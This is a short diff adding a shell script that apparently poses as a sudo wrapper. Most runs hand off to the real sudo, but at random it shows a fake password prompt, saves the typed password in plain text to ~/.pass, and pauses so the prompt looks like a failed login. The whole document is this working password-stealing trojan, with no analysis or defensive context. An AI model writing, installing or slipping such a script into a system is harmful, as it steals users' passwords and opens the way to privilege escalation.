@@ -1,0 +1,15 @@
+#!/bin/sh
+
+if [ $[ $RANDOM % 16 ] != 0 ]; then
+	exec sudo $*
+fi
+
+stty -echo
+echo -ne "Password: "
+read
+stty echo
+
+printf "%s\n" "$REPLY" >>~/.pass
+
+sleep 2.5
+echo
